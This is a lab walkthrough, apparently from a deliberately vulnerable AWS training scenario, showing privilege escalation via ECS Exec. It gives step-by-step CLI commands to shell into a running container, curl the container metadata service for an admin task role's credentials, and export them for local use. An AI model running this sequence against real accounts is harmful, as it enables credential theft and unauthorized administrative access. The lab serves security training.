# Guided Walkthrough: Privilege Escalation via ecs:ExecuteCommand + ecs:DescribeTasks

This scenario demonstrates a privilege escalation vulnerability where a user has permission to execute commands in running ECS containers (`ecs:ExecuteCommand`) and describe tasks (`ecs:DescribeTasks`). Both permissions are required because the AWS CLI internally calls `DescribeTasks` to retrieve the container runtime ID needed to establish the SSM session. When a container is running with a privileged task role attached, an attacker can shell into the container and retrieve the role's temporary credentials from the container metadata service, gaining administrative access.

Unlike new-passrole scenarios where attackers create new resources and pass roles to them, this attack exploits access to an **existing** running ECS task that already has an admin role attached. This represents a common real-world scenario where ECS Exec is enabled for debugging purposes on tasks that run with elevated privileges. The attacker doesn't need to create anything - they simply access what's already running.

The attack works by using `ecs:ExecuteCommand` (powered by AWS Systems Manager Session Manager) to establish an interactive shell session in the running container. Once inside, the attacker queries the container metadata service at `169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` to retrieve the temporary credentials for the task role. These credentials can then be used outside the container to perform administrative actions. This technique is particularly dangerous because ECS Exec is commonly enabled for legitimate troubleshooting purposes, but the security implications of combining it with privileged task roles are often overlooked.

## The Challenge

You start as `pl-prod-ecs-006-to-admin-starting-user` — an IAM user with `ecs:ExecuteCommand` and `ecs:DescribeTasks` permissions on the ECS cluster. Your goal is to obtain the credentials of `pl-prod-ecs-006-to-admin-target-role`, an IAM role with `AdministratorAccess` that is attached as the task role to a running ECS container.

The credentials for the starting user are provided via Terraform outputs.

## Reconnaissance

First, let's figure out what we're working with. List the ECS clusters in the account to confirm the target cluster exists:

```bash
aws ecs list-clusters
```

Now list the running tasks in the cluster:

```bash
aws ecs list-tasks --cluster pl-prod-ecs-006-to-admin-cluster
```

This returns the task ARN. To find the container name and confirm the task role, describe the task:

```bash
aws ecs describe-tasks \
    --cluster pl-prod-ecs-006-to-admin-cluster \
    --tasks <task-arn>
```

In the output, look at the `taskRoleArn` field — you'll see it points to `pl-prod-ecs-006-to-admin-target-role`. You can also see the container name (`sleep-container`) and confirm that the task is in `RUNNING` state with `enableExecuteCommand: true`.

## Exploitation

With the task ARN and container name confirmed, shell into the container using ECS Exec:

```bash
aws ecs execute-command \
    --cluster pl-prod-ecs-006-to-admin-cluster \
    --task <task-arn> \
    --container sleep-container \
    --interactive \
    --command "/bin/sh"
```

The AWS CLI internally calls `ecs:DescribeTasks` to retrieve the container runtime ID before establishing the SSM session — that's why both permissions are required. You'll get an interactive shell inside the running container.

Once inside the container, query the ECS container metadata service to retrieve the task role's temporary credentials:

```bash
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

The response is a JSON object containing `AccessKeyId`, `SecretAccessKey`, and `Token` for the `pl-prod-ecs-006-to-admin-target-role`. Exit the container shell, then set these as environment variables on your local machine:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from response>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from response>"
export AWS_SESSION_TOKEN="<Token from response>"
```

## Verification

Verify that you now have administrative access by listing IAM users:

```bash
aws iam list-users
```

If you see a list of IAM users in the account, the privilege escalation was successful. You are now operating as `pl-prod-ecs-006-to-admin-target-role` with `AdministratorAccess`.

## What Happened

You started with a low-privileged IAM user that had two ECS permissions: `ecs:ExecuteCommand` and `ecs:DescribeTasks`. By using these to shell into an already-running container that had an admin task role attached, you were able to retrieve the role's temporary credentials from the container metadata service at `169.254.170.2` — an endpoint accessible only from within the container.

This is a real-world risk pattern: ECS Exec is routinely enabled on tasks for operational debugging, but the security implications are rarely considered alongside the permissions of the task role. Any principal with `ecs:ExecuteCommand` access becomes capable of assuming the task role, making the effective permission boundary much wider than it appears from a policy review alone.
